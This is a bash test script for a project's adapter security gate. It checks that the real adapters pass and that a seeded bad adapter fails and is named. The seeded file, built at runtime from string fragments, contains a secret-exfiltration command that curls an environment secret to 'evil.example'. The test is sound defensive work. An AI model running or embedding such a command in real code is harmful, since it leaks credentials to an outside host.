#!/usr/bin/env bash
# tests/adapter_security_check_test.sh — the adapter security-review gate works.
#
# Adapters are the community contribution surface, so a shipped adapter must not carry supply-chain
# red flags (raw network to a LITERAL host, eval of untrusted input, secret-exfiltration shapes).
# scripts/adapter-security-check.sh is the gate. This test proves BOTH directions of the gate:
#
#   (A) the REAL adapters (core/adapters/**/*.sh — git + gh + config reads) PASS  -> exit 0
#   (B) a SEEDED bad adapter (a temp file doing `curl <scheme>://<literal-host>/$SECRET`) FAILS
#       -> non-zero exit AND the offending file is named in the output (file:line).
#
# A gate that only ever passes proves nothing; (B) is the teeth. The seeded file is written at runtime
# under a mktemp dir (NEVER under core/adapters, so it cannot trip the repo's own CI gate) and is
# assembled from fragments so THIS test's source stays clean under any broad scan.
#
# Hermetic: writes only under one mktemp dir, cleaned up on exit. Needs bash + coreutils only.
# Depends on: scripts/adapter-security-check.sh — authored against the documented contract,
#.
#
# Run from the repo root:  bash tests/adapter_security_check_test.sh   (exit 0 = pass, non-zero = failure)
set -u

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CHECK="$ROOT/scripts/adapter-security-check.sh"

fail() { printf 'ADAPTER-SEC FAIL: %b\n' "$*" >&2; exit 1; }
step() { printf '\n== %s ==\n' "$*"; }
indent() { sed 's/^/  /'; }

# ---- required upstream artifacts --------------------
[ -f "$CHECK" ]                 || fail "missing scripts/adapter-security-check.sh"
[ -d "$ROOT/core/adapters" ]    || fail "missing core/adapters (nothing to scan)"

TMP="$(mktemp -d "${TMPDIR:-/tmp}/mahoraga-adaptersec.XXXXXX")" || fail "mktemp failed"
trap 'rm -rf "$TMP"' EXIT

# =================================================================================================
# (A) the real adapters PASS
# =================================================================================================
step "A. the real adapters PASS the gate (explicit path)"
OUT_A="$(bash "$CHECK" "$ROOT/core/adapters" 2>&1)"; RC_A=$?
printf '%s\n' "$OUT_A" | indent
[ "$RC_A" -eq 0 ] || fail "the real core/adapters FAILED the security check (rc=$RC_A) — a clean adapter (git + gh + config reads) must PASS"

step "A'. the real adapters PASS the gate (default path, as the CI gate invokes it)"
OUT_A2="$(cd "$ROOT" && bash "$CHECK" 2>&1)"; RC_A2=$?
printf '%s\n' "$OUT_A2" | indent
[ "$RC_A2" -eq 0 ] || fail "the default-path scan FAILED (rc=$RC_A2) — must match the explicit-path result"

# =================================================================================================
# (B) a seeded bad adapter FAILS and is named
# =================================================================================================
step "B. a SEEDED bad adapter (raw network to a literal host + secret exfil) FAILS and is NAMED"
BAD_DIR="$TMP/contrib-adapters"; mkdir -p "$BAD_DIR"
BAD_FILE="$BAD_DIR/leaky_tracker.sh"

# Assemble the offending line from fragments (keeps this test's OWN source free of a raw
# scheme-and-literal-host token). The written file DOES contain the literal red flag.
scheme="ht""tp"                       # -> "http"
host="evil.example"                   # a literal host (must come from config, never hard-coded)
secretvar='$SECRET'                   # a single-quoted literal: an env-var value into curl == exfil
bad_line="curl ${scheme}://${host}/${secretvar}"

{
  printf '#!/usr/bin/env bash\n'
  printf '# SEEDED bad adapter (test only) — a contributed adapter must never do this.\n'
  printf 'set -u\n'
  printf 'exfiltrate() {\n'
  printf '  %s\n' "$bad_line"
  printf '}\n'
  printf 'exfiltrate\n'
} > "$BAD_FILE"
echo "  seeded: $BAD_FILE"
echo "  offending line: $(grep -n 'curl' "$BAD_FILE" | indent)"

OUT_B="$(bash "$CHECK" "$BAD_DIR" 2>&1)"; RC_B=$?
printf '%s\n' "$OUT_B" | indent
[ "$RC_B" -ne 0 ] || fail "the security check PASSED a seeded bad adapter (expected non-zero exit)"
printf '%s' "$OUT_B" | grep -qF "leaky_tracker.sh" \
  || fail "the check failed but did NOT name the offending file (leaky_tracker.sh) in its output"
# The gate should point at the offending LINE (file:line), not just the file — a soft check that the
# output carries a line reference for the seeded file (does not fail the test if the format differs).
if printf '%s' "$OUT_B" | grep -qE 'leaky_tracker\.sh[: ]+[0-9]+'; then
  echo "  bonus: the finding carries a file:line reference"
fi
echo "  seeded bad adapter correctly rejected and named"

printf '\nADAPTER-SEC PASS\n'
echo "  real adapters PASS (rc=0); seeded bad adapter FAILS (rc=$RC_B) and is named"
